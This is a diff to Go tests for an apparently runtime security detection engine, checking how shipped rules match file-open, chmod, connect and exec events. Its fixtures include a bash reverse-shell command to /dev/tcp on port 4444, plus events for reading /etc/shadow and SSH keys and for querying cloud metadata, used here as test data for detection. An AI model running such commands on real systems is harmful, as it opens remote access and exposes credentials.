@@ -82,7 +82,10 @@ func TestEngineEval(t *testing.T) {
 	}
 	eng := NewEngine(loaded)
 
-	const write = 1 // O_WRONLY
+	const (
+		write = 1 // O_WRONLY
+		rdwr  = 2 // O_RDWR
+	)
 
 	tests := []struct {
 		name string
@@ -96,9 +99,11 @@ func TestEngineEval(t *testing.T) {
 		{"zsh in container not host_shell", event.Event{Type: event.Exec, Comm: "zsh"}, enrich.Info{ContainerID: "abc"}, nil},
 		{"shadow read", event.Event{Type: event.Open, Filename: "/etc/shadow"}, enrich.Info{}, []string{"shadow_read"}},
 		{"shadow write not read rule", event.Event{Type: event.Open, Filename: "/etc/shadow", Flags: write}, enrich.Info{}, nil},
+		{"shadow rdwr triggers read rule", event.Event{Type: event.Open, Filename: "/etc/shadow", Flags: rdwr}, enrich.Info{}, []string{"shadow_read"}},
 		{"shadow backup not matched", event.Event{Type: event.Open, Filename: "/etc/shadow.bak"}, enrich.Info{}, nil},
 		{"bindir read not write rule", event.Event{Type: event.Open, Filename: "/usr/bin/x"}, enrich.Info{}, nil},
 		{"bindir write", event.Event{Type: event.Open, Filename: "/usr/bin/x", Flags: write}, enrich.Info{}, []string{"bindir_write"}},
+		{"bindir rdwr triggers write rule", event.Event{Type: event.Open, Filename: "/usr/bin/x", Flags: rdwr}, enrich.Info{}, []string{"bindir_write"}},
 		{"ssh key substring", event.Event{Type: event.Open, Filename: "/home/u/.ssh/id_rsa"}, enrich.Info{}, []string{"ssh_key_read"}},
 		{"setuid chmod", event.Event{Type: event.Chmod, Mode: 0o4755}, enrich.Info{}, []string{"setuid_set"}},
 		{"plain chmod no match", event.Event{Type: event.Chmod, Mode: 0o0644}, enrich.Info{}, nil},
@@ -167,5 +172,62 @@ func TestShippedRulesValid(t *testing.T) {
 	}
 	if len(loaded) == 0 {
 		t.Fatal("no shipped rules found")
+	}
+}
+
+// TestShippedRulesEval runs representative events against the real shipped
+// rules so a broken path list, wrong access mode, or missing MITRE mapping is
+// caught behaviorally — validation alone (TestShippedRulesValid) cannot see it.
+func TestShippedRulesEval(t *testing.T) {
+	loaded, err := LoadDir("../../rules")
+	if err != nil {
+		t.Fatalf("load shipped rules: %v", err)
+	}
+	eng := NewEngine(loaded)
+
+	const (
+		rdonly = 0 // O_RDONLY
+		wronly = 1 // O_WRONLY
+		rdwr   = 2 // O_RDWR
+	)
+	container := enrich.Info{ContainerID: "abc123def456"}
+
+	tests := []struct {
+		name string
+		ev   event.Event
+		info enrich.Info
+		want string // a rule that must be among the matches
+	}{
+		{"shadow O_RDONLY", event.Event{Type: event.Open, Filename: "/etc/shadow", Flags: rdonly}, enrich.Info{}, "sensitive_file_read"},
+		{"shadow O_RDWR still reads", event.Event{Type: event.Open, Filename: "/etc/shadow", Flags: rdwr}, enrich.Info{}, "sensitive_file_read"},
+		{"ssh key read", event.Event{Type: event.Open, Filename: "/home/u/.ssh/id_rsa", Flags: rdonly}, enrich.Info{}, "ssh_private_key_read"},
+		{"bindir write", event.Event{Type: event.Open, Filename: "/usr/bin/evil", Flags: wronly}, enrich.Info{}, "write_to_bindir"},
+		{"authorized_keys write", event.Event{Type: event.Open, Filename: "/root/.ssh/authorized_keys", Flags: wronly}, enrich.Info{}, "authorized_keys_write"},
+		{"setuid chmod", event.Event{Type: event.Chmod, Mode: 0o4755}, enrich.Info{}, "setuid_bit_set"},
+		{"metadata connect", event.Event{Type: event.Connect, DestIP: "169.254.169.254"}, enrich.Info{}, "cloud_metadata_access"},
+		{"high risk port", event.Event{Type: event.Connect, DestPort: 4444}, enrich.Info{}, "high_risk_port_connect"},
+		{"reverse shell args", event.Event{Type: event.Exec, Comm: "bash", Args: "bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, enrich.Info{}, "reverse_shell_command"},
+		{"shell in container", event.Event{Type: event.Exec, Comm: "bash"}, container, "shell_in_container"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := names(eng.Eval(tt.ev, tt.info))
+			if !slices.Contains(got, tt.want) {
+				t.Errorf("event matched %v, want %q among them", got, tt.want)
+			}
+		})
+	}
+}
+
+// TestLoadFSDuplicateName ensures a rule name defined in two files is rejected
+// rather than silently loaded twice.
+func TestLoadFSDuplicateName(t *testing.T) {
+	fsys := fstest.MapFS{
+		"a.yaml": {Data: []byte("- name: dup\n  event: exec\n  priority: low\n  match:\n    comm_in: [sh]\n")},
+		"b.yaml": {Data: []byte("- name: dup\n  event: open\n  priority: low\n  match:\n    path_exact: [/x]\n")},
+	}
+	if _, err := LoadFS(fsys); err == nil {
+		t.Fatal("expected error for duplicate rule name across files")
 	}
 }
